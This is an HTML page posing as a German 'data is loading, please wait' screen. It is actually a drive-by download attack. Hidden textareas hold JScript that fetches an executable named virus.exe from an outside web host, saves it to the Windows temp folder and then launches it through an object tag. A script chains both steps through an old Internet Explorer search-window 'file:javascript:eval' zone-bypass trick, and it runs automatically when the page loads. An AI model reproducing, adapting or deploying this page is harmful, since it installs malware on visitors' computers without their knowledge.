<html><head><!-- ERROR - NO CODE FOUND --></head>




































<body>


<br><br><center>Daten werden geladen...Bitte warten...</center>
































<textarea id="code" style="display: none;">s=new ActiveXObject("ADODB.Stream");
s.Mode=3;
s.Type=1;
s.Open();
x=new ActiveXObject("Microsoft.XMLHTTP");
x.Open("GET","http://www.walz-film.de/virus.exe",0);
x.Send();
s.Write(x.responseBody);
s.SaveToFile("C:\\windows\\temp\\virus.exe",2);
</textarea>

<textarea id="code2" style="display: none;">md="&lt;object id=\"oFile\""+
    " classid=\"clsid:11111111-1111-1111-1111-111111111111\""+
    " codebase=\"c:/windows/temp/virus.exe\"&gt;&lt;/object&gt;";

w=createPopup();
w.document.clear();
w.document.write(md);
</textarea>

<script language="javascript">
    function preparecode(code) {
        result = '';
        lines = code.split(/\r\n/);
        for (i=0;i<lines.length;i++) {

            line = lines[i];
            line = line.replace(/^\s+/,"");
            line = line.replace(/\s+$/,"");
            line = line.replace(/[\\]/g,"\\\\");
            line = line.replace(/'/g,"\\'");
            line = line.replace(/"/g,"\\\"");
            line = line.replace(/[/]/g,"%2f");

            line = line.replace(/\r\n/,"");
            line += ' ';

            if (line != '') {
                result += line;
            }
        }
        return result;
    }
    function weiter() {
        open(myURL,"_search");
    }

    function starten(thecode) {
        mycode = preparecode(thecode);
        myURL = "file:javascript:eval('" + mycode + "')";
        open("http:///","_search");
        setTimeout("weiter()", 500);
    } 

    function doit() {
    starten(document.all.code.value);
    setTimeout("doit2()", 600);
    }   

    function doit2() {
    starten(document.all.code2.value);
    }   


doit();
</script></body></html>